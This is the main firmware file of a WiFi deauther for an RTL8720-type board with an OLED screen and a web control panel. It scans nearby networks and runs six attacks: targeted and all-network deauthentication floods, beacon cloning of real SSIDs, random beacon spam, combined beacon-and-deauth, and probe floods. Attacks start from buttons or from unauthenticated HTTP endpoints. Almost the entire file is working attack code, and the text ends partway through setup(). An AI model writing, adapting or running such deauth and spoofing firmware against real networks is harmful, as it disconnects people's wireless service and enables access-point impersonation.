// Cypher 5G Deauther v2.0 -- github.com/dkyazzentwatwa/cypher-5G-deauther
// Original OLED code by warwick320, rewritten and upgraded by Cypher

// ── WiFi ──────────────────────────────────────────────────────────────────────
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// ── Misc ──────────────────────────────────────────────────────────────────────
#undef max
#undef min
#include <SPI.h>
#include "vector"
#include "debug.h"
#include <Wire.h>

// ── Display ───────────────────────────────────────────────────────────────────
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// ── Web UI (PROGMEM HTML) ─────────────────────────────────────────────────────
#include "web_ui.h"

// ── Firmware version ──────────────────────────────────────────────────────────
#define DEAUTHER_VER "v2.0"  // renamed from FW_VERSION to avoid conflict with rtl8721d.h

// ── Pins ──────────────────────────────────────────────────────────────────────
#define BTN_DOWN PA27
#define BTN_UP   PA12
#define BTN_OK   PA13

// ── App state machine ─────────────────────────────────────────────────────────
enum AppState {
  STATE_TITLE,
  STATE_MAIN_MENU,
  STATE_SCANNING,
  STATE_NETWORK_LIST,
  STATE_ATTACK_MENU,
  STATE_ATTACKING,
  STATE_SETTINGS,
  STATE_INFO
};
AppState appState = STATE_TITLE;

// ── Attack types ──────────────────────────────────────────────────────────────
enum AttackType {
  ATK_SINGLE_DEAUTH = 0,
  ATK_ALL_DEAUTH    = 1,
  ATK_BEACON_CLONE  = 2,
  ATK_RANDOM_BEACON = 3,
  ATK_BEACON_DEAUTH = 4,
  ATK_PROBE_FLOOD   = 5
};

// ── Menu cursor indices ───────────────────────────────────────────────────────
int mainMenuIdx    = 0;  // 0-4: Scan / Select / Attack / Settings / Info
int mainMenuScroll = 0;  // top item in the 4-item scroll window
int attackMenuIdx  = 0;  // 0-6 (6 = Back)
int networkIdx     = 0;
int settingsIdx    = 0;  // 0-2: active settings item

// ── Settings values ───────────────────────────────────────────────────────────
int settingDeauthCount = 3;   // 1-10
int settingScanTimeSec = 5;   // 2, 5, or 10
int settingBandFilter  = 0;   // 0=All, 1=2.4G, 2=5G

// ── Attack runtime ────────────────────────────────────────────────────────────
bool       attackRunning      = false;
AttackType currentAttackType  = ATK_SINGLE_DEAUTH;
int        attackAllIdx       = 0;
unsigned long lastAttackStepMs = 0;
const unsigned long ATTACK_STEP_MS = 10;

// ── Scan state ────────────────────────────────────────────────────────────────
bool          scanInProgress = false;
unsigned long scanStartMs    = 0;

// ── WiFi scan results ─────────────────────────────────────────────────────────
typedef struct {
  String  ssid;
  String  bssid_str;
  uint8_t bssid[6];
  short   rssi;
  uint    channel;
} WiFiScanResult;
std::vector<WiFiScanResult> scan_results;

// ── Selected target ───────────────────────────────────────────────────────────
int     selectedIdx   = 0;
uint8_t deauth_bssid[6] = {0};
uint8_t beacon_bssid[6] = {0};

// ── AP credentials ────────────────────────────────────────────────────────────
const char *ap_ssid = "littlehakr";
const char *ap_pass = "0123456789";
int current_channel = 1;

// ── Web server ────────────────────────────────────────────────────────────────
WiFiServer server(80);

// ── Button debounce + edge detection ─────────────────────────────────────────
unsigned long lastDownMs = 0;
unsigned long lastUpMs   = 0;
unsigned long lastOkMs   = 0;
const unsigned long DEBOUNCE_MS = 250;
bool prevBtnUp   = false;
bool prevBtnDown = false;
bool prevBtnOk   = false;

// ── Display refresh guard ─────────────────────────────────────────────────────
unsigned long lastDisplayMs = 0;
const unsigned long DISPLAY_REFRESH_MS = 50;

// ── Bitmap assets (unchanged from original) ───────────────────────────────────
static const unsigned char PROGMEM img_wifi_bits[] = {
  0x21,0xf0,0x00,0x16,0x0c,0x00,0x08,0x03,0x00,0x25,0xf0,0x80,
  0x42,0x0c,0x40,0x89,0x02,0x20,0x10,0xa1,0x00,0x23,0x58,0x80,
  0x04,0x24,0x00,0x08,0x52,0x00,0x01,0xa8,0x00,0x02,0x04,0x00,
  0x00,0x42,0x00,0x00,0xa1,0x00,0x00,0x40,0x80,0x00,0x00,0x00
};
static const unsigned char PROGMEM img_off_bits[] = {
  0x67,0x70,0x94,0x40,0x96,0x60,0x94,0x40,0x64,0x40
};
static const unsigned char PROGMEM img_nonet_bits[] = {
  0x82,0x0e,0x44,0x0a,0x28,0x0a,0x10,0x0a,0x28,0xea,0x44,0xaa,
  0x82,0xaa,0x00,0xaa,0x0e,0xaa,0x0a,0xaa,0x0a,0xaa,0x0a,0xaa,
  0xea,0xaa,0xaa,0xaa,0xee,0xee,0x00,0x00
};
static const unsigned char PROGMEM img_cross_bits[] = {
  0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x80,0x51,0x40,0x8a,0x20,
  0x44,0x40,0x20,0x80,0x11,0x00,0x20,0x80,0x44,0x40,0x8a,0x20,
  0x51,0x40,0x20,0x80,0x00,0x00,0x00,0x00
};

// ─────────────────────────────────────────────────────────────────────────────
// WiFi scan callback
// ─────────────────────────────────────────────────────────────────────────────
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid    = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi    = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char buf[] = "XX:XX:XX:XX:XX:XX";
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = buf;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

// ─────────────────────────────────────────────────────────────────────────────
// Scan control
// ─────────────────────────────────────────────────────────────────────────────
void startScan() {
  scan_results.clear();
  scanInProgress = true;
  scanStartMs    = millis();
  wifi_scan_networks(scanResultHandler, NULL);
  appState = STATE_SCANNING;
}

static bool bandFilterFn(const WiFiScanResult &r) {
  if (settingBandFilter == 1) return r.channel >= 36;  // keep 2.4G: remove 5G
  if (settingBandFilter == 2) return r.channel < 36;   // keep 5G: remove 2.4G
  return false;
}

void checkScanComplete() {
  if (!scanInProgress) return;
  unsigned long elapsed = millis() - scanStartMs;
  if (elapsed < (unsigned long)(settingScanTimeSec * 1000)) return;

  scanInProgress = false;
  if (settingBandFilter != 0) {
    std::vector<WiFiScanResult> filtered;
    for (size_t i = 0; i < scan_results.size(); i++) {
      if (!bandFilterFn(scan_results[i])) filtered.push_back(scan_results[i]);
    }
    scan_results = filtered;
  }

  if (scan_results.size() == 0) {
    appState = STATE_MAIN_MENU;
    return;
  }
  networkIdx  = 0;
  selectedIdx = 0;
  memcpy(deauth_bssid, scan_results[0].bssid, 6);
  memcpy(beacon_bssid, scan_results[0].bssid, 6);
  appState = STATE_NETWORK_LIST;
}

// ─────────────────────────────────────────────────────────────────────────────
// Attack helpers
// ─────────────────────────────────────────────────────────────────────────────
String generateRandomSSID() {
  const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  String s = "";
  unsigned long t = millis();
  int len = 4 + (int)((t ^ (t >> 4)) % 9);
  for (int i = 0; i < len; i++) {
    t = t * 1664525UL + 1013904223UL;
    s += chars[(t >> 16) % 36];
  }
  return s;
}

void generateRandomMAC(uint8_t *mac) {
  unsigned long seed = millis();
  for (int i = 0; i < 6; i++) {
    seed = seed * 1664525UL + 1013904223UL;
    mac[i] = (seed >> 16) & 0xFF;
  }
  mac[0] &= 0xFE;  // clear multicast bit
  mac[0] |= 0x02;  // set locally-administered bit
}

void startAttack(AttackType type) {
  currentAttackType = type;
  attackRunning     = true;
  attackAllIdx      = 0;
  lastAttackStepMs  = 0;
  if (scan_results.size() > 0 &&
      type != ATK_RANDOM_BEACON &&
      type != ATK_PROBE_FLOOD) {
    wext_set_channel(WLAN0_NAME, scan_results[selectedIdx].channel);
  }
}

void stopAttack() {
  attackRunning = false;
  attackAllIdx  = 0;
}

void runAttackStep() {
  if (!attackRunning) return;
  if (scan_results.size() == 0 &&
      currentAttackType != ATK_RANDOM_BEACON &&
      currentAttackType != ATK_PROBE_FLOOD) {
    stopAttack();
    return;
  }

  unsigned long now = millis();
  if (now - lastAttackStepMs < ATTACK_STEP_MS) return;
  lastAttackStepMs = now;

  static const uint8_t BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

  switch (currentAttackType) {

    case ATK_SINGLE_DEAUTH:
      wext_set_channel(WLAN0_NAME, scan_results[selectedIdx].channel);
      wifi_tx_deauth_frame(deauth_bssid, (void *)BROADCAST, 1);
      wifi_tx_deauth_frame(deauth_bssid, (void *)BROADCAST, 4);
      wifi_tx_deauth_frame(deauth_bssid, (void *)BROADCAST, 16);
      break;

    case ATK_ALL_DEAUTH:
      if (attackAllIdx >= (int)scan_results.size()) attackAllIdx = 0;
      memcpy(deauth_bssid, scan_results[attackAllIdx].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[attackAllIdx].channel);
      for (int x = 0; x < settingDeauthCount; x++) {
        wifi_tx_deauth_frame(deauth_bssid, (void *)BROADCAST, 1);
        wifi_tx_deauth_frame(deauth_bssid, (void *)BROADCAST, 4);
        wifi_tx_deauth_frame(deauth_bssid, (void *)BROADCAST, 16);
      }
      attackAllIdx++;
      break;

    case ATK_BEACON_CLONE: {
      if (attackAllIdx >= (int)scan_results.size()) attackAllIdx = 0;
      const char *ssid1 = scan_results[attackAllIdx].ssid.c_str();
      memcpy(beacon_bssid, scan_results[attackAllIdx].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[attackAllIdx].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(beacon_bssid, (void *)BROADCAST, ssid1);
      }
      attackAllIdx++;
      break;
    }

    case ATK_RANDOM_BEACON: {
      uint8_t rand_mac[6];
      generateRandomMAC(rand_mac);
      String rsid = generateRandomSSID();
      wext_set_channel(WLAN0_NAME, (int)(millis() % 13) + 1);
      for (int x = 0; x < 5; x++) {
        wifi_tx_beacon_frame(rand_mac, (void *)BROADCAST, rsid.c_str());
      }
      break;
    }

    case ATK_BEACON_DEAUTH: {
      if (attackAllIdx >= (int)scan_results.size()) attackAllIdx = 0;
      const char *ssid1 = scan_results[attackAllIdx].ssid.c_str();
      memcpy(beacon_bssid, scan_results[attackAllIdx].bssid, 6);
      memcpy(deauth_bssid, scan_results[attackAllIdx].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[attackAllIdx].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(beacon_bssid, (void *)BROADCAST, ssid1);
        wifi_tx_deauth_frame(deauth_bssid, (void *)BROADCAST, 0);
      }
      attackAllIdx++;
      break;
    }

    case ATK_PROBE_FLOOD: {
      uint8_t rand_mac[6];
      generateRandomMAC(rand_mac);
      String rsid = generateRandomSSID();
      wext_set_channel(WLAN0_NAME, (int)(millis() % 13) + 1);
      wifi_tx_probe_frame(rand_mac, rsid.c_str());
      break;
    }
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Settings adjustment
// ─────────────────────────────────────────────────────────────────────────────
void adjustSettingValue(int idx, int dir) {
  switch (idx) {
    case 0:
      settingDeauthCount = constrain(settingDeauthCount + dir, 1, 10);
      break;
    case 1:
      if (dir > 0) {
        settingScanTimeSec = (settingScanTimeSec == 2) ? 5 : (settingScanTimeSec == 5) ? 10 : 2;
      } else {
        settingScanTimeSec = (settingScanTimeSec == 10) ? 5 : (settingScanTimeSec == 5) ? 2 : 10;
      }
      break;
    case 2:
      settingBandFilter = constrain(settingBandFilter + dir, 0, 2);
      break;
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Button handlers
// ─────────────────────────────────────────────────────────────────────────────
void updateMainScroll() {
  if (mainMenuIdx < mainMenuScroll) mainMenuScroll = mainMenuIdx;
  if (mainMenuIdx >= mainMenuScroll + 4) mainMenuScroll = mainMenuIdx - 3;
}

void onButtonUp() {
  switch (appState) {
    case STATE_MAIN_MENU:
      if (mainMenuIdx > 0) { mainMenuIdx--; updateMainScroll(); }
      break;
    case STATE_ATTACK_MENU:
      if (attackMenuIdx > 0) attackMenuIdx--;
      break;
    case STATE_NETWORK_LIST:
      if (networkIdx > 0) networkIdx--;
      break;
    case STATE_SETTINGS:
      if (settingsIdx > 0) settingsIdx--;
      break;

    default:
      break;
  }
}

void onButtonDown() {
  switch (appState) {
    case STATE_MAIN_MENU:
      if (mainMenuIdx < 4) { mainMenuIdx++; updateMainScroll(); }
      break;
    case STATE_ATTACK_MENU:
      if (attackMenuIdx < 6) attackMenuIdx++;
      break;
    case STATE_NETWORK_LIST:
      if (networkIdx < (int)scan_results.size() - 1) networkIdx++;
      break;
    case STATE_SETTINGS:
      if (settingsIdx < 3) settingsIdx++;
      break;
    default:
      break;
  }
}

void onButtonOk() {
  switch (appState) {
    case STATE_TITLE:
      appState = STATE_MAIN_MENU;
      break;

    case STATE_MAIN_MENU:
      switch (mainMenuIdx) {
        case 0: startScan();                    break;
        case 1: appState = STATE_NETWORK_LIST;  break;
        case 2: appState = STATE_ATTACK_MENU;   break;
        case 3: appState = STATE_SETTINGS;      break;
        case 4: appState = STATE_INFO;          break;
      }
      break;

    case STATE_ATTACK_MENU:
      if (attackMenuIdx == 6) {
        appState = STATE_MAIN_MENU;
      } else {
        startAttack((AttackType)attackMenuIdx);
        appState = STATE_ATTACKING;
      }
      break;

    case STATE_ATTACKING:
      stopAttack();
      appState = STATE_ATTACK_MENU;
      break;

    case STATE_NETWORK_LIST:
      selectedIdx = networkIdx;
      if (scan_results.size() > 0) {
        memcpy(deauth_bssid, scan_results[selectedIdx].bssid, 6);
        memcpy(beacon_bssid, scan_results[selectedIdx].bssid, 6);
      }
      appState = STATE_MAIN_MENU;
      break;

    case STATE_SETTINGS:
      if (settingsIdx == 3) {  // Back item
        appState = STATE_MAIN_MENU;
      } else {
        adjustSettingValue(settingsIdx, +1);  // OK cycles the value forward
      }
      break;

    case STATE_INFO:
      appState = STATE_MAIN_MENU;
      break;

    default:
      break;
  }
}

void handleButtons() {
  unsigned long now = millis();

  bool btnUp   = (digitalRead(BTN_UP)   == LOW);
  bool btnDown = (digitalRead(BTN_DOWN) == LOW);
  bool btnOk   = (digitalRead(BTN_OK)   == LOW);

  // Edge detection: only fire on the LOW transition (button just pressed),
  // not while held. Debounce guards against noise on the falling edge.
  if (btnUp && !prevBtnUp && (now - lastUpMs > DEBOUNCE_MS)) {
    lastUpMs = now;
    onButtonUp();
  }
  if (btnDown && !prevBtnDown && (now - lastDownMs > DEBOUNCE_MS)) {
    lastDownMs = now;
    onButtonDown();
  }
  if (btnOk && !prevBtnOk && (now - lastOkMs > DEBOUNCE_MS)) {
    lastOkMs = now;
    onButtonOk();
  }

  prevBtnUp   = btnUp;
  prevBtnDown = btnDown;
  prevBtnOk   = btnOk;
}

// ─────────────────────────────────────────────────────────────────────────────
// OLED drawing primitives
// ─────────────────────────────────────────────────────────────────────────────
void drawFrame() {
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
  display.drawRect(2, 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - 4, WHITE);
}

void drawProgressBar(int x, int y, int w, int h, int pct) {
  display.drawRect(x, y, w, h, WHITE);
  display.fillRect(x + 2, y + 2, (w - 4) * pct / 100, h - 4, WHITE);
}

void drawStatusBar(const char *label) {
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(4, 1);
  display.print(label);
  display.setTextColor(WHITE);
}

void drawMenuItem(int y, const char *text, bool selected) {
  if (selected) {
    display.fillRect(4, y - 1, SCREEN_WIDTH - 8, 11, WHITE);
    display.setTextColor(BLACK);
  } else {
    display.setTextColor(WHITE);
  }
  display.setCursor(8, y);
  display.print(text);
  display.setTextColor(WHITE);
}

// 4-bar signal strength indicator
void drawSignalBars(int x, int y, int rssi) {
  int lvl = 0;
  if (rssi >= -50) lvl = 4;
  else if (rssi >= -65) lvl = 3;
  else if (rssi >= -75) lvl = 2;
  else if (rssi >= -85) lvl = 1;

  for (int b = 0; b < 4; b++) {
    int bh = (b + 1) * 3;
    int bx = x + b * 5;
    int by = y + 12 - bh;
    if (b < lvl) {
      display.fillRect(bx, by, 4, bh, WHITE);
    } else {
      display.drawRect(bx, by, 4, bh, WHITE);
    }
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// OLED screens
// ─────────────────────────────────────────────────────────────────────────────
void drawTitle() {
  display.setTextWrap(false);
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(6, 7);
  display.print("little hakr presents");
  display.setCursor(24, 48);
  display.print("5 G H Z");
  display.setCursor(4, 55);
  display.print("d e a u t h e r");
  // Firmware version top-right
  display.setCursor(86, 1);
  display.print(DEAUTHER_VER);
  // Bitmap decorations
  display.drawBitmap(1,   20, img_wifi_bits,  19, 16, 1);
  display.drawBitmap(112, 35, img_off_bits,   12,  5, 1);
  display.drawBitmap(45,  19, img_wifi_bits,  19, 16, 1);
  display.drawBitmap(68,  13, img_wifi_bits,  19, 16, 1);
  display.drawBitmap(24,  34, img_off_bits,   12,  5, 1);
  display.drawBitmap(106, 14, img_wifi_bits,  19, 16, 1);
  display.drawBitmap(109, 48, img_nonet_bits, 15, 16, 1);
  display.drawBitmap(88,  25, img_wifi_bits,  19, 16, 1);
  display.drawBitmap(24,  14, img_wifi_bits,  19, 16, 1);
  display.drawBitmap(9,   35, img_cross_bits, 11, 16, 1);
}

void drawMainMenu() {
  const char *items[] = { "Scan", "Select", "Attack", "Settings", "Info" };
  drawFrame();
  drawStatusBar("MAIN MENU");

  for (int i = 0; i < 4; i++) {
    int idx = mainMenuScroll + i;
    if (idx >= 5) break;
    drawMenuItem(14 + (i * 12), items[idx], idx == mainMenuIdx);
  }
  // Scroll arrows
  if (mainMenuScroll > 0) {
    display.fillTriangle(118, 13, 122, 10, 126, 13, WHITE);
  }
  if (mainMenuScroll + 4 < 5) {
    display.fillTriangle(118, 61, 122, 64, 126, 61, WHITE);
  }
}

void drawScanning() {
  drawFrame();
  drawStatusBar("SCANNING...");

  static const char *frames[] = { "/", "-", "\\", "|" };
  int frame = (int)(millis() / 250) % 4;
  display.setCursor(28, 24);
  display.setTextSize(1);
  display.print("Scanning ");
  display.print(frames[frame]);

  unsigned long elapsed = millis() - scanStartMs;
  int totalMs = settingScanTimeSec * 1000;
  int pct = (int)constrain((long)elapsed * 100 / totalMs, 0L, 100L);
  drawProgressBar(14, 38, 100, 8, pct);

  display.setCursor(14, 50);
  display.print(elapsed / 1000);
  display.print("s / ");
  display.print(settingScanTimeSec);
  display.print("s");
}

void drawNetworkList() {
  if (scan_results.size() == 0) {
    drawFrame();
    drawStatusBar("NETWORKS");
    display.setCursor(8, 30);
    display.print("No networks found");
    return;
  }

  char statusBuf[18];
  snprintf(statusBuf, sizeof(statusBuf), "NET [%d/%d]",
           networkIdx + 1, (int)scan_results.size());
  drawFrame();
  drawStatusBar(statusBuf);

  const WiFiScanResult &r = scan_results[networkIdx];
  bool is5G = r.channel >= 36;

  // SSID (truncated to 12 chars)
  display.setCursor(4, 14);
  String s = r.ssid;
  if (s.length() > 12) s = s.substring(0, 12);
  display.print(s);

  // Band badge
  display.drawRect(SCREEN_WIDTH - 24, 12, 22, 10, WHITE);
  display.setCursor(SCREEN_WIDTH - 21, 14);
  display.print(is5G ? "5G" : "2.4G");

  // RSSI bars + dBm
  drawSignalBars(4, 26, r.rssi);
  display.setCursor(26, 29);
  display.print(r.rssi);
  display.print("dBm");

  // BSSID last 3 octets
  char bshort[10];
  snprintf(bshort, sizeof(bshort), "%02X:%02X:%02X",
           r.bssid[3], r.bssid[4], r.bssid[5]);
  display.setCursor(4, 42);
  display.print(bshort);

  // Channel
  display.setCursor(4, 52);
  display.print("CH:");
  display.print(r.channel);

  // Target indicator
  if (networkIdx == selectedIdx) {
    display.setCursor(68, 52);
    display.print("[TARGET]");
  }

  // Scroll arrows
  if (networkIdx > 0) {
    display.fillTriangle(118, 17, 122, 13, 126, 17, WHITE);
  }
  if (networkIdx < (int)scan_results.size() - 1) {
    display.fillTriangle(118, 59, 122, 63, 126, 59, WHITE);
  }
}

void drawAttackMenu() {
  const char *items[] = {
    "Single Deauth",
    "All Deauth",
    "Beacon Clone",
    "Random Beacon",
    "Beacon+Deauth",
    "Probe Flood",
    "Back"
  };
  drawFrame();
  drawStatusBar("ATTACK MODE");

  // Show 5 items at a time
  int scroll = 0;
  if (attackMenuIdx >= 5) scroll = attackMenuIdx - 4;
  for (int i = 0; i < 5; i++) {
    int idx = scroll + i;
    if (idx >= 7) break;
    drawMenuItem(13 + (i * 10), items[idx], idx == attackMenuIdx);
  }
  // Scroll arrows
  if (scroll > 0) {
    display.fillTriangle(118, 13, 122, 10, 126, 13, WHITE);
  }
  if (scroll + 5 < 7) {
    display.fillTriangle(118, 61, 122, 64, 126, 61, WHITE);
  }
}

void drawAttacking() {
  const char *atkNames[] = {
    "SINGLE DEAUTH",
    "ALL DEAUTH",
    "BEACON CLONE",
    "RANDOM BEACON",
    "BEACON+DEAUTH",
    "PROBE FLOOD"
  };
  drawFrame();

  // Flashing status bar
  if ((millis() / 500) % 2 == 0) {
    display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
    display.setTextColor(BLACK);
  } else {
    display.setTextColor(WHITE);
  }
  display.setCursor(4, 1);
  display.print("ATTACK RUNNING");
  display.setTextColor(WHITE);

  if ((int)currentAttackType < 6) {
    display.setCursor(8, 17);
    display.print(atkNames[(int)currentAttackType]);
  }

  // Target SSID (not for random attacks)
  if (scan_results.size() > 0 &&
      currentAttackType != ATK_RANDOM_BEACON &&
      currentAttackType != ATK_PROBE_FLOOD) {
    display.setCursor(8, 29);
    String t = scan_results[selectedIdx].ssid;
    if (t.length() > 15) t = t.substring(0, 15);
    display.print(t);
  }

  // Spinner
  static const char *sp[] = { ">", ">>", ">>>", ">>>>" };
  display.setCursor(8, 42);
  display.print(sp[(millis() / 200) % 4]);

  display.setCursor(8, 54);
  display.print("[OK] to stop");
}

void drawSettings() {
  const char *bandLabels[] = { "All", "2.4G", "5G" };
  drawFrame();
  drawStatusBar("SETTINGS");

  // Item 0: Deauth Count
  drawMenuItem(13, "Deauth Cnt", settingsIdx == 0);
  display.setTextColor(WHITE);
  display.setCursor(94, 13);
  display.print(settingDeauthCount);

  // Item 1: Scan Time
  drawMenuItem(24, "Scan Time", settingsIdx == 1);
  display.setTextColor(WHITE);
  display.setCursor(94, 24);
  display.print(settingScanTimeSec);
  display.print("s");

  // Item 2: Band Filter
  drawMenuItem(35, "Band", settingsIdx == 2);
  display.setTextColor(WHITE);
  display.setCursor(94, 35);
  display.print(bandLabels[settingBandFilter]);

  // Item 3: Back
  drawMenuItem(46, "Back", settingsIdx == 3);

  display.setCursor(4, 57);
  display.setTextColor(WHITE);
  display.print("UP/DN:nav  OK:change");
}

void drawInfo() {
  drawFrame();
  drawStatusBar("INFO");

  display.setCursor(4, 13);
  display.print("IP: ");
  display.print(WiFi.localIP());

  display.setCursor(4, 23);
  display.print("Nets: ");
  display.print(scan_results.size());

  display.setCursor(4, 33);
  display.print("FW: ");
  display.print(DEAUTHER_VER);

  if (scan_results.size() > 0 && selectedIdx < (int)scan_results.size()) {
    const WiFiScanResult &r = scan_results[selectedIdx];

    display.setCursor(4, 43);
    String s = r.ssid;
    if (s.length() > 12) s = s.substring(0, 12);
    display.print("TGT: ");
    display.print(s);

    display.setCursor(4, 53);
    display.print("CH:");
    display.print(r.channel);
    display.print(" RSSI:");
    display.print(r.rssi);
  }
}

void updateDisplay() {
  unsigned long now = millis();
  if (now - lastDisplayMs < DISPLAY_REFRESH_MS) return;
  lastDisplayMs = now;

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);

  switch (appState) {
    case STATE_TITLE:        drawTitle();        break;
    case STATE_MAIN_MENU:    drawMainMenu();     break;
    case STATE_SCANNING:     drawScanning();     break;
    case STATE_NETWORK_LIST: drawNetworkList();  break;
    case STATE_ATTACK_MENU:  drawAttackMenu();   break;
    case STATE_ATTACKING:    drawAttacking();    break;
    case STATE_SETTINGS:     drawSettings();     break;
    case STATE_INFO:         drawInfo();         break;
  }

  display.display();
}

// ─────────────────────────────────────────────────────────────────────────────
// Web server
// ─────────────────────────────────────────────────────────────────────────────
String extractParam(const String &req, const String &key) {
  int start = req.indexOf(key + "=");
  if (start < 0) return "";
  start += key.length() + 1;
  int end = req.indexOf('&', start);
  if (end < 0) end = req.indexOf(' ', start);
  if (end < 0) return req.substring(start);
  return req.substring(start, end);
}

void serveNetworksJson(WiFiClient &client) {
  client.print(F("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n"
                 "Access-Control-Allow-Origin: *\r\n\r\n"));
  client.print("[");
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (i > 0) client.print(",");
    client.print("{\"idx\":");     client.print(i);
    client.print(",\"ssid\":\"");  client.print(scan_results[i].ssid);
    client.print("\",\"bssid\":\"");client.print(scan_results[i].bssid_str);
    client.print("\",\"ch\":");    client.print(scan_results[i].channel);
    client.print(",\"rssi\":");    client.print(scan_results[i].rssi);
    client.print(",\"band\":\"");
    client.print(scan_results[i].channel >= 36 ? "5G" : "2.4G");
    client.print("\"}");
  }
  client.print("]");
}

void serveStatusJson(WiFiClient &client) {
  client.print(F("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n"
                 "Access-Control-Allow-Origin: *\r\n\r\n"));
  client.print("{\"attacking\":");
  client.print(attackRunning ? "true" : "false");
  client.print(",\"attack_type\":");
  client.print(attackRunning ? (int)currentAttackType : -1);
  client.print(",\"target_idx\":");
  client.print(selectedIdx);
  client.print(",\"net_count\":");
  client.print(scan_results.size());
  client.print(",\"state\":");
  client.print((int)appState);
  client.print(",\"scanning\":");
  client.print(scanInProgress ? "true" : "false");
  client.print("}");
}

void handleWebClient() {
  WiFiClient client = server.available();
  if (!client) return;

  // Read request line with timeout
  unsigned long timeout = millis() + 300;
  while (!client.available() && millis() < timeout) { /* spin */ }

  String req = "";
  while (client.available()) {
    char c = client.read();
    if (c == '\n') break;
    if (c != '\r') req += c;
  }
  while (client.available()) client.read();  // drain headers

  if (req.indexOf("GET / ") >= 0 || req.indexOf("GET /index") >= 0) {
    client.print(F("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"));
    sendProgmemPage(client);

  } else if (req.indexOf("GET /networks.json") >= 0) {
    serveNetworksJson(client);

  } else if (req.indexOf("GET /status.json") >= 0) {
    serveStatusJson(client);

  } else if (req.indexOf("GET /attack") >= 0) {
    String typeStr = extractParam(req, "type");
    if (typeStr.length() > 0) {
      int t = typeStr.toInt();
      if (t >= 0 && t <= 5) {
        startAttack((AttackType)t);
        appState = STATE_ATTACKING;
        client.print(F("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nstarted"));
      } else {
        client.print(F("HTTP/1.1 400 Bad Request\r\n\r\nbad type"));
      }
    } else {
      client.print(F("HTTP/1.1 400 Bad Request\r\n\r\nmissing type"));
    }

  } else if (req.indexOf("GET /stop") >= 0) {
    stopAttack();
    appState = STATE_MAIN_MENU;
    client.print(F("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nstopped"));

  } else if (req.indexOf("GET /scan") >= 0) {
    startScan();
    client.print(F("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nscanning"));

  } else if (req.indexOf("GET /select") >= 0) {
    String idxStr = extractParam(req, "idx");
    if (idxStr.length() > 0) {
      int idx = idxStr.toInt();
      if (idx >= 0 && idx < (int)scan_results.size()) {
        selectedIdx = idx;
        networkIdx  = idx;
        memcpy(deauth_bssid, scan_results[idx].bssid, 6);
        memcpy(beacon_bssid, scan_results[idx].bssid, 6);
        client.print(F("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nselected"));
      } else {
        client.print(F("HTTP/1.1 400 Bad Request\r\n\r\nbad idx"));
      }
    } else {
      client.print(F("HTTP/1.1 400 Bad Request\r\n\r\nmissing idx"));
    }

  } else if (req.indexOf("GET /settings") >= 0) {
    String dc = extractParam(req, "deauth_count");
    String st = extractParam(req, "scan_time");
    String bf = extractParam(req, "band");
    if (dc.length() > 0) settingDeauthCount = constrain(dc.toInt(), 1, 10);
    if (st.length() > 0) {
      int t = st.toInt();
      if (t == 2 || t == 5 || t == 10) settingScanTimeSec = t;
    }
    if (bf.length() > 0) settingBandFilter = constrain(bf.toInt(), 0, 2);
    client.print(F("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nok"));

  } else {
    client.print(F("HTTP/1.1 404 Not Found\r\n\r\n"));
  }

  client.stop();
}

// ─────────────────────────────────────────────────────────────────────────────
// Setup
// ─────────────────────────────────────────────────────────────────────────────
void setup() {
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP,   INPUT_PULLUP);
  pinMode(BTN_OK,   INPUT_PULLUP);

  Serial.begin(115200);

  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true);
  }

  // Show title while initializing
  display.clearDisplay();
  drawTitle();
  display.display();

  DEBUG_SER_INIT();

  WiFi.apbegin((char *)ap_ssid, (char *)ap_pass, (char *)String(current_channel).c_str());
  server.begin();  // was missing in original

  // Initial scan — one blocking delay is acceptable at boot
  scan_results.clear();
  wifi_scan_networks(scanResultHandler, NULL);
